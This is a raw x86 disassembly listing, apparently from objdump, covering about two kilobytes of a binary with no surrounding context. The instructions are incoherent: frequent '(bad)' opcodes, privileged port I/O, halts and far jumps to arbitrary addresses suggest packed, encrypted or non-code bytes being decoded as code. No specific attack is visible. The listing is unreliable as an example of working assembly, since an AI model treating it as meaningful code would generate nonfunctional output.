  42654c:	lds    ecx,FWORD PTR [esi+0x6648f5ba]
  426552:	mov    ah,0xb9
  426554:	xchg   esp,eax
  426555:	mov    BYTE PTR [ebp-0x3db7668b],ah
  42655b:	and    BYTE PTR [ebx],dh
  42655d:	jmp    0x95fe:0x4d3936e4
  426564:	pop    esp
  426565:	(bad)  
  426566:	hlt    
  426567:	loopne 0x4265d6
  426569:	pop    ebx
  42656a:	jp     0x426584
  42656c:	or     BYTE PTR [eax-0x7823ca89],0xdf
  426573:	addr16 cdq 
  426575:	jecxz  0x4265f0
  426577:	push   ebx
  426578:	retf   0x4967
  42657b:	arpl   WORD PTR [edx-0x4a2a7e46],bp
  426581:	adc    BYTE PTR [eax+0x65],dl
  426584:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426585:	push   ecx
  426586:	add    BYTE PTR ds:0x2bb18372,al
  42658c:	out    dx,al
  42658d:	cld    
  42658e:	jmp    edx
  426590:	aas    
  426591:	and    DWORD PTR [edi-0x7a],ebp
  426594:	mov    bh,0x1
  426596:	pop    es
  426597:	push   es
  426598:	xchg   DWORD PTR [edx+0x36d636bc],edi
  42659e:	xchg   ecx,eax
  42659f:	(bad)  
  4265a1:	pop    ds
  4265a2:	jbe    0x4265c2
  4265a4:	mov    esp,0x68869ce7
  4265a9:	hlt    
  4265aa:	sbb    DWORD PTR [ebx],eax
  4265ac:	jmp    0x426584
  4265ae:	neg    esp
  4265b0:	and    al,BYTE PTR [ecx+0x25]
  4265b3:	sbb    cl,BYTE PTR [edi-0x1c7fff7a]
  4265b9:	sbb    al,0x57
  4265bb:	push   edx
  4265bc:	in     al,dx
  4265bd:	test   DWORD PTR [ebp-0x1a],edi
  4265c0:	add    DWORD PTR [ebx],ecx
  4265c2:	jo     0x426631
  4265c4:	lods   al,BYTE PTR ds:[esi]
  4265c5:	mov    bl,0xb5
  4265c7:	mov    BYTE PTR [ecx+0x8],bh
  4265ca:	(bad)  
  4265cb:	and    DWORD PTR [ebx+0x41fe50ae],edi
  4265d1:	(bad)  
  4265d2:	jle    0x426644
  4265d4:	fs cli 
  4265d6:	cwde   
  4265d7:	xchg   ebx,eax
  4265d8:	leave  
  4265d9:	mov    ss,WORD PTR [eax+0x4843266]
  4265df:	dec    edi
  4265e0:	inc    eax
  4265e1:	out    dx,eax
  4265e2:	jge    0x4265e9
  4265e4:	jle    0x4265e6
  4265e6:	cmp    edi,DWORD PTR [eax]
  4265e8:	or     al,0x4
  4265ea:	daa    
  4265eb:	jne    0x4265c7
  4265ed:	aad    0xf3
  4265ef:	pop    edi
  4265f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4265f1:	in     eax,0xe9
  4265f3:	jmp    0xeba63830
  4265f8:	(bad)  
  4265f9:	fidiv  DWORD PTR [edi+0x4b]
  4265fc:	add    DWORD PTR [edi],0xffffffdd
  4265ff:	inc    edx
  426600:	xlat   BYTE PTR ds:[ebx]
  426601:	out    dx,eax
  426602:	loope  0x4265de
  426604:	lods   eax,DWORD PTR ds:[esi]
  426605:	mov    ds:0x8b57546,al
  42660a:	aas    
  42660b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42660c:	pop    es
  42660d:	aad    0xfd
  42660f:	in     eax,0x7c
  426611:	adc    eax,0x11725a27
  426616:	hlt    
  426617:	sub    al,0xbc
  426619:	pusha  
  42661a:	xor    BYTE PTR [ecx+esi*2+0x3d],dh
  42661e:	rcr    DWORD PTR [eax+0x2ebae37],1
  426624:	idiv   DWORD PTR [ebx]
  426626:	jl     0x42667e
  426628:	pop    esp
  426629:	push   ss
  42662a:	stos   BYTE PTR es:[edi],al
  42662b:	sti    
  42662c:	pop    ebp
  42662d:	and    DWORD PTR [eax+0x58],ebx
  426630:	sti    
  426631:	and    dl,bh
  426633:	push   cs
  426634:	rol    DWORD PTR [edi+eiz*4+0x549fcf4b],1
  42663b:	fdivp  st(7),st
  42663d:	add    dl,BYTE PTR [ebp-0x3c]
  426640:	iret   
  426641:	es inc edx
  426643:	fisub  DWORD PTR [eax+0x3c11350c]
  426649:	fsubr  DWORD PTR [ebx-0x20108473]
  42664f:	or     eax,0x13765b1c
  426654:	mov    edi,0xfa442bd3
  426659:	into   
  42665a:	sub    ecx,esi
  42665c:	add    esp,ebx
  42665e:	inc    edx
  42665f:	add    eax,0xb90199b7
  426664:	stos   BYTE PTR es:[edi],al
  426665:	les    eax,FWORD PTR ds:0xf8d2392c
  42666b:	shl    BYTE PTR [esi],cl
  42666d:	xchg   esi,eax
  42666e:	adc    BYTE PTR [esi],dl
  426670:	xchg   edx,eax
  426671:	mov    ecx,0xe22a8888
  426676:	pop    esp
  426677:	repz push cs
  426679:	test   al,0x71
  42667b:	(bad)  
  42667c:	inc    ecx
  42667d:	dec    esp
  42667e:	mov    eax,0x4c733a07
  426684:	push   esp
  426685:	jl     0x42668f
  426687:	jg     0x42667e
  426689:	mov    ds:0x11e445fa,eax
  42668e:	call   0x88271bea
  426693:	outs   dx,DWORD PTR ds:[esi]
  426694:	enter  0xe495,0xda
  426698:	push   eax
  426699:	adc    BYTE PTR [ebx+0x687a425d],bh
  42669f:	xchg   ebp,eax
  4266a0:	mov    bh,0x4
  4266a2:	in     al,0xba
  4266a4:	mov    bl,0xe7
  4266a6:	lgs    ebp,FWORD PTR [ebx]
  4266a9:	dec    esi
  4266aa:	or     cl,BYTE PTR [edi+edx*2+0x15b21a10]
  4266b1:	inc    esp
  4266b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4266b3:	popf   
  4266b4:	jbe    0x4266ae
  4266b6:	je     0x4266af
  4266b8:	dec    edi
  4266b9:	cmp    bl,BYTE PTR [ecx]
  4266bb:	mov    eax,ds:0xd31db91b
  4266c0:	test   BYTE PTR [ecx],cl
  4266c2:	add    DWORD PTR ds:0xf9f77c2d,0x2a
  4266c9:	push   esp
  4266ca:	push   ebx
  4266cb:	out    dx,eax
  4266cc:	sahf   
  4266cd:	mov    eax,0x1b07e01
  4266d2:	arpl   WORD PTR [edx-0x5a],si
  4266d5:	jmp    0x1538:0xf676ed9f
  4266dc:	ins    BYTE PTR es:[edi],dx
  4266dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4266de:	pop    edi
  4266df:	(bad)  
  4266e0:	pop    edx
  4266e1:	inc    edi
  4266e2:	cmc    
  4266e3:	nop
  4266e4:	mov    ch,0xd7
  4266e6:	in     eax,0xd6
  4266e8:	int3   
  4266e9:	push   esp
  4266ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4266eb:	jmp    0x426673
  4266ed:	jno    0x426719
  4266ef:	dec    edi
  4266f0:	mov    ebx,0x5e26f333
  4266f5:	ja     0x4266ea
  4266f7:	imul   ebp,DWORD PTR [ecx],0x2a
  4266fa:	in     al,0x7e
  4266fc:	das    
  4266fd:	daa    
  4266fe:	add    edi,esi
  426700:	rol    BYTE PTR [eax],cl
  426702:	aas    
  426703:	das    
  426704:	push   edx
  426705:	inc    esi
  426706:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426707:	retf   0xa72e
  42670a:	jmp    0xa1bb:0x22979d41
  426711:	jecxz  0x4266aa
  426713:	in     al,dx
  426714:	sbb    DWORD PTR [eax],0xffffffc5
  426717:	jp     0x4266eb
  426719:	test   ebx,0xa5340a30
  42671f:	jae    0x4266f8
  426721:	or     al,0xd1
  426723:	cmp    dh,BYTE PTR [edi+0x715302e5]
  426729:	xor    cl,BYTE PTR [edi]
  42672b:	test   BYTE PTR [ebx-0x52d76362],dl
  426731:	retf   
  426732:	dec    esi
  426733:	and    eax,0x18ab17e6
  426738:	popf   
  426739:	xlat   BYTE PTR ds:[ebx]
  42673a:	adc    DWORD PTR [eax],ebx
  42673c:	arpl   WORD PTR [esi-0x2a2e4edb],di
  426742:	aad    0x29
  426744:	bound  ecx,QWORD PTR [ebp-0x31]
  426747:	sbb    BYTE PTR [edi+esi*4-0x20],bl
  42674b:	adc    DWORD PTR [esi-0x65],esi
  42674e:	or     dh,0x2
  426751:	mov    ebp,0x8b2cf82a
  426756:	push   esi
  426757:	dec    eax
  426758:	frstor [edi+0x125b599a]
  42675e:	gs cwde 
  426760:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426761:	lock mov edx,0xcf5ebd12
  426767:	jmp    0x608ac6fc
  42676c:	(bad)  
  42676d:	les    ebp,FWORD PTR [ebx-0x6d]
  426770:	sahf   
  426771:	push   ecx
  426772:	out    0xd9,al
  426774:	jl     0x4267dc
  426776:	cmp    al,0xb9
  426778:	popa   
  426779:	jle    0x42678a
  42677b:	mov    al,BYTE PTR [edx+0x0]
  42677e:	test   al,0x4c
  426780:	arpl   bx,si
  426782:	(bad)  
  426783:	ds fwait
  426785:	push   ecx
  426786:	call   0x5e73:0xa6d67a34
  42678d:	inc    esp
  42678e:	jp     0x426747
  426790:	sbb    edi,esp
  426792:	adc    ch,bl
  426794:	ror    BYTE PTR [ecx+ebp*1-0x20],cl
  426798:	fstp   QWORD PTR [edi-0x4d]
  42679b:	xchg   ecx,eax
  42679c:	xchg   esp,eax
  42679d:	cs (bad) 
  4267a0:	or     ch,bh
  4267a2:	mov    eax,0xb3515dec
  4267a7:	pop    ebp
  4267a8:	rcl    BYTE PTR [ecx+0x45],1
  4267ab:	add    eax,0x39a13055
  4267b0:	sti    
  4267b1:	sbb    BYTE PTR [ebx],bh
  4267b3:	cs adc al,0xbf
  4267b6:	mov    edx,0x91f23a69
  4267bb:	ret    0x2671
  4267be:	mov    bh,0x4d
  4267c0:	dec    esi
  4267c1:	(bad)  
  4267c3:	fwait
  4267c4:	jae    0x42681e
  4267c6:	push   eax
  4267c7:	dec    edi
  4267c8:	inc    ebx
  4267c9:	xchg   eax,eax
  4267cb:	jmp    0xf9596e9
  4267d0:	xchg   ecx,eax
  4267d1:	cmp    al,0x63
  4267d3:	dec    edx
  4267d4:	int    0x6d
  4267d6:	scas   al,BYTE PTR es:[edi]
  4267d7:	out    0xee,al
  4267d9:	sbb    bh,BYTE PTR [esi-0xf]
  4267dc:	dec    esp
  4267dd:	les    ecx,FWORD PTR [esi-0xf]
  4267e0:	addr16 push ss
  4267e2:	mov    dl,0xab
  4267e4:	sub    al,0x50
  4267e6:	xor    bl,bh
  4267e8:	or     BYTE PTR [edx-0x18],ah
  4267eb:	mov    edi,0x8b72730f
  4267f0:	mov    edi,0x58963f07
  4267f5:	mov    al,ds:0x510064e7
  4267fa:	cmp    BYTE PTR [eax+edx*4],dl
  4267fd:	aas    
  4267fe:	inc    ecx
  4267ff:	test   dl,0xca
  426802:	ins    BYTE PTR es:[edi],dx
  426803:	cdq    
  426804:	xchg   DWORD PTR [eax],eax
  426806:	push   ebx
  426807:	call   0x101e46a4
  42680c:	stos   BYTE PTR es:[edi],al
  42680d:	daa    
  42680e:	jae    0x4267e1
  426810:	dec    ebx
  426811:	dec    ebx
  426812:	sub    eax,0x32075a58
  426817:	mov    ecx,0x7e210d
  42681c:	ins    BYTE PTR es:[edi],dx
  42681d:	or     DWORD PTR [ebx-0x69],eax
  426820:	dec    BYTE PTR [ecx-0x43]
  426823:	call   0x7c6d:0xbd0f32dd
  42682a:	xor    eax,0xb77bfbd8
  42682f:	xor    DWORD PTR [ebx],ecx
  426831:	ret    
  426832:	xor    esi,DWORD PTR [ebx+0x7d6137a3]
  426838:	xor    cl,ch
  42683a:	sbb    edi,esi
  42683c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42683d:	push   ebx
  42683e:	xchg   ebp,eax
  42683f:	mov    ds:0xfd779baf,al
  426844:	(bad)  
  426845:	es test al,0xe9
  426848:	xchg   esp,esi
  42684a:	inc    esp
  42684b:	mov    cl,0x2b
  42684d:	xchg   edx,eax
  42684e:	shl    esi,1
  426850:	mov    ah,0xab
  426852:	jno    0x4267df
  426854:	add    ch,BYTE PTR [edi+edi*8-0x3ea29291]
  42685b:	mov    BYTE PTR [eax+ebp*1+0x1b],ah
  42685f:	ins    DWORD PTR es:[edi],dx
  426860:	sbb    bl,BYTE PTR [esp+ebp*2+0x132ae52c]
  426867:	shl    BYTE PTR [ebx-0x4c3062fe],1
  42686d:	(bad)  
  42686e:	mov    ds:0xd7919920,al
  426873:	fwait
	...
  426880:	add    cl,al
  426882:	into   
  426883:	psrld  mm1,QWORD PTR [edi]
  426886:	rcr    ebp,cl
  426888:	fistp  QWORD PTR [ebp+edi*8+0x37]
  42688c:	push   esp
  42688d:	add    BYTE PTR [ebp-0x21332c51],cl
  426893:	add    DWORD PTR [eax],eax
  426895:	stos   DWORD PTR es:[edi],eax
  426896:	add    eax,DWORD PTR [eax]
  426898:	add    ch,bl
  42689a:	inc    eax
  42689b:	mov    ch,0xc2
  42689d:	int    0x3b
  42689f:	out    0xc4,eax
  4268a1:	hlt    
  4268a2:	mov    eax,ds:0xcb97c111
  4268a7:	sub    ebp,DWORD PTR [ebx+0x1c]
  4268aa:	fcomp  QWORD PTR [esi+0x22]
  4268ad:	cs call 0x3a04a80e
  4268b3:	fld    DWORD PTR [ecx-0x3e4b49f]
  4268b9:	bound  ebp,QWORD PTR [esi]
  4268bb:	push   edx
  4268bc:	popw   ss
  4268be:	push   esp
  4268bf:	popf   
  4268c0:	call   0x880d:0xb2413bb5
  4268c7:	mov    dh,0x6c
  4268c9:	cdq    
  4268ca:	add    DWORD PTR [edi+0x58241a39],ecx
  4268d0:	cmc    
  4268d1:	mov    al,0xc2
  4268d3:	gs popa 
  4268d5:	push   ebp
  4268d6:	hlt    
  4268d7:	sub    dl,BYTE PTR [esi-0x4f8db7cb]
  4268dd:	imul   edi,DWORD PTR [ebx+0x35b4beb7],0x205a016e
  4268e7:	in     al,dx
  4268e8:	sbb    BYTE PTR [ecx+esi*4+0xd020cd5],ch
  4268ef:	push   0x692f8673
  4268f4:	pushf  
  4268f5:	int3   
  4268f6:	pop    es
  4268f7:	in     eax,dx
  4268f8:	pop    es
  4268f9:	ins    BYTE PTR es:[edi],dx
  4268fa:	out    0x15,al
  4268fc:	(bad)  [edx+0x498e3e79]
  426902:	ins    DWORD PTR es:[edi],dx
  426903:	sbb    BYTE PTR [edi],bl
  426905:	cmp    dl,cl
  426907:	adc    BYTE PTR [ecx],cl
  426909:	outs   dx,BYTE PTR ds:[esi]
  42690a:	clc    
  42690b:	cmp    ah,BYTE PTR [eax]
  42690d:	into   
  42690e:	je     0x426952
  426910:	push   esi
  426911:	mov    es,WORD PTR [esi+0x1]
  426914:	adc    BYTE PTR [ebp-0x31],bh
  426917:	out    0x24,eax
  426919:	jns    0x426983
  42691b:	sub    eax,0x246f73cc
  426920:	out    0xab,al
  426922:	xchg   edi,eax
  426923:	mov    edi,0x3d4e0e15
  426928:	dec    esi
  426929:	stos   BYTE PTR es:[edi],al
  42692a:	sub    DWORD PTR [esi-0x14f66eb4],esi
  426930:	ds retf 
  426932:	pop    esp
  426933:	dec    esp
  426934:	mov    dh,BYTE PTR [edx+0x67ca2512]
  42693a:	mov    bh,0x6c
  42693c:	jmp    0x426942
  42693e:	adc    ch,BYTE PTR [esi+0x1092b1f0]
  426944:	xor    al,0x20
  426946:	cmc    
  426947:	shr    BYTE PTR [ecx],0xdd
  42694a:	hlt    
  42694b:	retf   0x9e0f
  42694e:	xor    BYTE PTR [ebp-0x6906959a],ah
  426954:	aaa    
  426955:	call   0x6190be8e
  42695a:	mov    al,ds:0xae1bf056
  42695f:	mov    dl,BYTE PTR [ecx+edi*4]
  426962:	inc    ebp
  426963:	sub    DWORD PTR [edi-0x35],edi
  426966:	das    
  426967:	add    dl,ch
  426969:	push   es
  42696a:	xchg   ebx,eax
  42696b:	loope  0x42692d
  42696d:	pop    eax
  42696e:	mov    edi,0x68a2ef4f
  426973:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426974:	mov    ds:0x1379e5b0,al
  426979:	je     0x426940
  42697b:	outs   dx,DWORD PTR ds:[esi]
  42697c:	sti    
  42697d:	popa   
  42697e:	addr16 mov bl,0xc5
  426981:	and    ch,BYTE PTR [ecx]
  426983:	jge    0x426955
  426985:	(bad)  
  426986:	jbe    0x4269a2
  426988:	or     dh,dh
  42698a:	adc    DWORD PTR [esi-0x29],ebx
  42698d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42698e:	xchg   edi,eax
  42698f:	inc    esi
  426990:	xchg   eax,edx
  426992:	pop    eax
  426993:	repz xor al,0xdf
  426996:	push   0x59
  426998:	xchg   esi,eax
  426999:	push   ss
  42699a:	psllw  mm1,mm5
  42699d:	fdiv   QWORD PTR [edx]
  42699f:	cmp    eax,0x77b4c4e9
  4269a4:	fnstenv [ebp-0x6bccd734]
  4269aa:	adc    eax,0xe16a4ad0
  4269af:	adc    ebx,esp
  4269b1:	cmp    cl,BYTE PTR [ebx-0x76]
  4269b4:	push   ebp
  4269b5:	pop    es
  4269b6:	mov    DWORD PTR [ebp-0x8ea7395],ebx
  4269bc:	dec    edx
  4269be:	rcl    BYTE PTR [ebx+0x5a],cl
  4269c1:	push   esi
  4269c2:	mov    bh,0xc9
  4269c4:	shl    BYTE PTR [edi-0x5d78557e],1
  4269ca:	in     eax,dx
  4269cb:	push   ebp
  4269cc:	inc    esp
  4269cd:	cmp    esp,DWORD PTR [ecx-0x20379e3]
  4269d3:	inc    edi
  4269d4:	mov    dh,0x2c
  4269d6:	in     al,0xad
  4269d8:	test   BYTE PTR [edx],0x4c
  4269db:	xchg   edx,eax
  4269dc:	dec    eax
  4269dd:	loopne 0x426a3d
  4269df:	sar    BYTE PTR [ecx-0x4c994988],cl
  4269e5:	adc    al,0x73
  4269e7:	inc    esp
  4269e8:	aad    0x66
  4269ea:	xor    esp,DWORD PTR [edi+0x39]
  4269ed:	sbb    BYTE PTR [eax-0x161347c6],al
  4269f3:	jne    0x4269ba
  4269f5:	mov    edx,0xc888d903
  4269fa:	push   esi
  4269fb:	mov    eax,0xa3437f32
  426a00:	ds (bad) 
  426a02:	ins    BYTE PTR es:[edi],dx
  426a03:	daa    
  426a04:	pop    DWORD PTR [esi+0x38]
  426a07:	jb     0x426a3b
  426a09:	mov    esp,0xde1521bb
  426a0e:	or     eax,0x583f6896
  426a13:	fwait
  426a14:	mov    dl,0x2
  426a16:	jno    0x4269d2
  426a18:	outs   dx,DWORD PTR ds:[esi]
  426a19:	and    al,0x28
  426a1b:	shr    esi,1
  426a1d:	scas   al,BYTE PTR es:[edi]
  426a1e:	mov    WORD PTR [esi],ds
  426a20:	push   esi
  426a21:	leave  
  426a22:	inc    eax
  426a23:	mov    dh,0x5b
  426a25:	sar    DWORD PTR [eax+0x128a6f67],0xa4
  426a2c:	or     ebx,ebx
  426a2e:	mov    ecx,0x5916cc64
  426a33:	xor    DWORD PTR [esi+0x6d81dc61],esp
  426a39:	cli    
  426a3a:	inc    esi
  426a3b:	daa    
  426a3c:	pop    edx
  426a3d:	xchg   DWORD PTR [edx+0x77],edx
  426a40:	sbb    edi,edi
  426a42:	in     al,0xed
  426a44:	mov    esi,0x4abbf9b5
  426a49:	xchg   ebp,eax
  426a4a:	enter  0xc2e7,0xd5
  426a4e:	(bad)  
  426a4f:	and    bh,BYTE PTR [edi+0x3c85deb2]
  426a55:	push   esp
  426a56:	shl    DWORD PTR [edx-0x6a],0xdd
  426a5a:	fdiv   QWORD PTR [ebp+0x1e8f94c1]
  426a60:	(bad)  
  426a61:	push   esp
  426a62:	rcr    ebx,cl
  426a64:	fs add al,0x9d
  426a67:	inc    ebp
  426a68:	sub    ch,dh
  426a6a:	pop    esp
  426a6b:	mov    ah,0xa9
  426a6d:	add    al,dl
  426a6f:	sub    BYTE PTR [ebx+0x14],bh
  426a72:	out    0x3a,al
  426a74:	dec    edx
  426a75:	cmp    al,0x9f
  426a78:	sub    al,0x59
  426a7a:	mov    ds:0xf87cb430,al
  426a7f:	xor    DWORD PTR [ebp-0x55],ebx
  426a82:	adc    ch,0x93
  426a85:	mov    esi,0x712137c4
  426a8a:	xchg   BYTE PTR [eax-0x23],bl
  426a8d:	inc    ebp
  426a8e:	icebp  
  426a8f:	loopne 0x426a99
  426a91:	pop    es
  426a92:	ins    DWORD PTR es:[edi],dx
  426a93:	jmp    0x574f:0x879e8755
  426a9a:	out    dx,eax
  426a9b:	add    dl,BYTE PTR [esi*2+0x3955d6a1]
  426aa2:	xchg   esi,eax
  426aa3:	sar    DWORD PTR [ebp+0x60],cl
  426aa6:	es stos BYTE PTR es:[edi],al
  426aa8:	sbb    eax,0x5c30494a
  426aad:	mov    cl,0x91
  426aaf:	and    al,0x81
  426ab1:	retf   
  426ab2:	jp     0x426b04
  426ab4:	inc    edi
  426ab5:	add    BYTE PTR [edi],dl
  426ab7:	adc    BYTE PTR [esi],ah
  426ab9:	das    
  426aba:	in     al,dx
  426abb:	sbb    al,0xbb
  426abd:	dec    ecx
  426abe:	in     al,0x66
  426ac0:	icebp  
  426ac1:	in     eax,dx
  426ac2:	test   BYTE PTR [esi+edx*2+0x6d044937],ah
  426ac9:	and    DWORD PTR [edx+0x35294ee4],edx
  426acf:	jns    0x426a9c
  426ad1:	pop    esi
  426ad2:	xchg   ebp,eax
  426ad3:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  426ad5:	dec    esi
  426ad6:	adc    BYTE PTR cs:[esi+eax*4-0x57],bh
  426adb:	div    BYTE PTR [edx-0x562f2e48]
  426ae1:	push   ds
  426ae2:	aas    
  426ae3:	add    al,0x28
  426ae5:	lods   al,BYTE PTR ds:[esi]
  426ae6:	mov    dl,dl
  426ae8:	xchg   ebx,eax
  426ae9:	aas    
  426aea:	xor    ch,cl
  426aec:	xchg   ecx,eax
  426aed:	inc    ebx
  426aee:	lahf   
  426aef:	sub    cl,BYTE PTR [esi]
  426af1:	sbb    eax,0x79a3d085
  426af6:	inc    ebx
  426af7:	into   
  426af8:	stos   DWORD PTR es:[edi],eax
  426af9:	push   esp
  426afa:	lods   eax,DWORD PTR ds:[esi]
  426afb:	dec    ecx
  426afc:	hlt    
  426afd:	push   ebx
  426afe:	popf   
  426aff:	inc    edi
  426b00:	(bad)  
  426b01:	jnp    0x426ae7
  426b03:	add    eax,edx
  426b05:	mov    ebx,0x4e6426c2
  426b0a:	mov    ds,WORD PTR [ebx-0x10]
  426b0d:	push   esi
  426b0e:	cli    
  426b0f:	and    esi,ebp
  426b11:	test   eax,0x9c307676
  426b16:	push   ebp
  426b17:	or     al,0x54
  426b19:	inc    ebx
  426b1a:	inc    eax
  426b1b:	loope  0x426b7f
  426b1d:	add    bh,BYTE PTR [edi-0x10b4b946]
  426b23:	popf   
  426b24:	aam    0xaa
  426b26:	mov    dh,0x68
  426b28:	adc    eax,0x433eaf75
  426b2d:	pop    edx
  426b2e:	ds push 0xffffff9f
  426b31:	add    bl,BYTE PTR [edx]
  426b33:	dec    ecx
  426b34:	(bad)  [ecx+0x12b9d0f0]
  426b3a:	jo     0x426b22
  426b3c:	popf   
  426b3d:	lock inc ecx
  426b3f:	sub    eax,0x131e4d9a
  426b44:	stc    
  426b45:	xor    edx,ebp
  426b47:	xor    eax,0xf88b7d82
  426b4c:	push   esi
  426b4d:	sub    dl,BYTE PTR [esp+ecx*4+0x3c0d2d9b]
  426b54:	sbb    BYTE PTR [eax],dl
  426b56:	popf   
  426b57:	in     al,0x13
  426b59:	dec    eax
  426b5a:	mov    ah,0x1a
  426b5c:	pop    ds
  426b5d:	jmp    0x8a399309
  426b62:	(bad)  [edx]
  426b64:	mov    esp,0xa2b07fa9
  426b69:	fsub   QWORD PTR [edx]
  426b6b:	jo     0x426b57
  426b6d:	ret    0x93dd
  426b70:	dec    edi
  426b71:	aas    
  426b72:	test   al,0xd5
  426b74:	or     ch,cl
  426b76:	ja     0x426b11
  426b78:	jecxz  0x426b49
  426b7a:	pop    ebp
  426b7b:	rcl    BYTE PTR [esi],cl
  426b7d:	fwait
  426b7e:	out    0x22,eax
  426b80:	out    0x86,al
  426b82:	pusha  
  426b83:	mov    al,0xb8
  426b85:	mov    dl,0x5e
  426b87:	or     edi,DWORD PTR [edx+0x2540a3f0]
  426b8d:	cdq    
  426b8e:	jns    0x426b68
  426b90:	fdiv   QWORD PTR [ebx]
  426b92:	mov    ds:0xfeae3714,eax
  426b97:	adc    DWORD PTR [ebp+0x16bbbd26],esi
  426b9d:	push   ss
  426b9e:	jmp    0x90394c7b
  426ba3:	loopne 0x426b60
  426ba5:	xor    al,0xbc
  426ba7:	mov    esp,DWORD PTR [ecx-0x66]
  426baa:	fnstsw WORD PTR [edi-0x2ff30a2f]
  426bb0:	or     ebx,DWORD PTR [edi]
  426bb2:	push   edx
  426bb3:	mov    bl,0x6d
  426bb5:	jnp    0x426b76
  426bb7:	fst    QWORD PTR [edx+0x18]
  426bba:	and    bl,BYTE PTR ds:0xc50a0b2
  426bc0:	pop    ds
  426bc1:	xchg   ecx,eax
  426bc2:	fld    QWORD PTR [ebx+eax*4+0x29]
  426bc6:	iret   
  426bc7:	inc    esp
  426bc8:	(bad)  
  426bca:	mov    ebp,0x658b804
  426bcf:	int    0x8b
  426bd1:	cmp    esi,0x384ac5bf
  426bd7:	mov    dl,ah
  426bd9:	jno    0x426bcf
  426bdb:	sahf   
  426bdc:	push   ebx
  426bdd:	and    DWORD PTR [esi-0x1fb9d2b3],edx
  426be3:	dec    esp
  426be4:	push   0xc483bdf3
  426be9:	sub    eax,0xdedeb9b3
  426bee:	xchg   ebp,eax
  426bef:	hlt    
  426bf0:	or     BYTE PTR [esi],ch
  426bf2:	xchg   esp,esp
  426bf4:	rcr    DWORD PTR ds:0x218993d3,1
  426bfa:	test   DWORD PTR [esi-0x73],esi
  426bfd:	dec    ecx
  426bfe:	(bad)  
  426c00:	sti    
  426c01:	jmp    0xfa3c0b
  426c06:	xchg   ecx,eax
  426c07:	not    BYTE PTR [esi+0x5]
  426c0a:	cmp    al,0x53
  426c0c:	sbb    ebx,DWORD PTR [edx-0x3db8122b]
  426c12:	fld    st(3)
  426c14:	xor    bh,al
  426c16:	in     al,0x89
  426c18:	inc    ecx
  426c19:	sub    BYTE PTR [esi-0x36],bh
  426c1c:	clc    
  426c1d:	xchg   DWORD PTR [ebp+ebx*4-0x64576272],ebp
  426c24:	mov    ecx,0x2132687b
  426c29:	pop    ecx
  426c2a:	shl    dh,0xba
  426c2d:	clc    
  426c2e:	ret    0x6046
  426c31:	xor    DWORD PTR [edx+0x12e694d0],ecx
  426c37:	icebp  
  426c38:	or     BYTE PTR [edx+0x16],bh
  426c3b:	jne    0x426be9
  426c3d:	in     al,0xed
  426c3f:	out    0x26,al
  426c41:	cmp    eax,0x9feb
	...
  426c4e:	add    BYTE PTR [eax],al
  426c50:	add    al,dh
  426c52:	lock pusha 
  426c54:	pushf  
  426c55:	pusha  
  426c56:	pushf  
  426c57:	cld    
  426c58:	cld    
  426c59:	push   es
  426c5a:	dec    edx
  426c5b:	lock cmp ecx,DWORD PTR [ecx+0x75]
  426c5f:	ret    
  426c60:	or     eax,0x1e277
  426c65:	stos   DWORD PTR es:[edi],eax
  426c66:	add    eax,DWORD PTR [eax]
  426c68:	add    BYTE PTR [esi+ebp*1-0x40],ch
  426c6c:	dec    ebx
  426c6d:	pusha  
  426c6e:	fdivp  st(6),st
  426c70:	or     al,0x68
  426c72:	mov    al,0x2f
  426c74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426c75:	jg     0x426c7a
  426c77:	call   0xff6ffbac
  426c7c:	int    0xfa
  426c7e:	adc    ebx,DWORD PTR [edx]
  426c80:	ror    BYTE PTR [eax-0x2b285f3],cl
  426c86:	push   cs
  426c87:	and    bl,0xf3
  426c8a:	and    BYTE PTR [eax],dh
  426c8c:	dec    edx
  426c8d:	jmp    0xd7a9:0xb742f612
  426c94:	out    0x6a,eax
  426c96:	sahf   
  426c97:	in     al,0x30
  426c99:	test   BYTE PTR [ecx+0x3],ah
  426c9c:	adc    esp,esp
  426c9e:	mov    edi,0xf7cb5351
  426ca3:	pop    esi
  426ca4:	jp     0x426cac
  426ca6:	shr    BYTE PTR [ecx],0x11
  426ca9:	nop
  426caa:	int3   
  426cab:	sbb    esi,ebp
  426cad:	fidiv  DWORD PTR ds:[edi]
  426cb0:	jecxz  0x426cc1
  426cb2:	pop    DWORD PTR [edx]
  426cb4:	les    eax,FWORD PTR [esi+0x7e]
  426cb7:	dec    edx
  426cb8:	(bad)  
  426cba:	pop    ds
  426cbb:	pop    edi
  426cbc:	in     al,dx
  426cbd:	icebp  
  426cbe:	out    dx,al
  426cbf:	pop    eax
  426cc0:	xchg   esi,edi
  426cc2:	ret    
  426cc3:	push   eax
  426cc4:	iret   
  426cc5:	push   esi
  426cc6:	call   0x95852784
  426ccb:	inc    esp
  426ccc:	cmp    al,0x22
  426cce:	into   
  426ccf:	mov    al,0xfd
  426cd1:	mov    DWORD PTR [eax],esi
  426cd3:	adc    DWORD PTR [ecx+ecx*8-0x76a85018],edx
  426cda:	add    cl,BYTE PTR [ebx+0x7e]
  426cdd:	add    eax,0x5db389d8
  426ce2:	jmp    0x426d2c
  426ce4:	popf   
  426ce5:	add    ah,bh
  426ce7:	leave  
  426ce8:	addr16 pusha 
  426cea:	fnstcw WORD PTR [ebp+0x61]
  426ced:	mov    bl,0x6a
  426cef:	enter  0x50e4,0x47
  426cf3:	dec    ebx
  426cf4:	sub    BYTE PTR [ebp-0x5a],dl
  426cf7:	mov    edx,0x8cae57cb
  426cfc:	dec    edi
  426cfd:	jne    0x426c89
  426cff:	sbb    al,0x2
  426d01:	clc    
  426d02:	jae    0x426c91
  426d04:	andnps xmm6,xmm0
  426d07:	ror    BYTE PTR [ebp+0x1343902a],cl
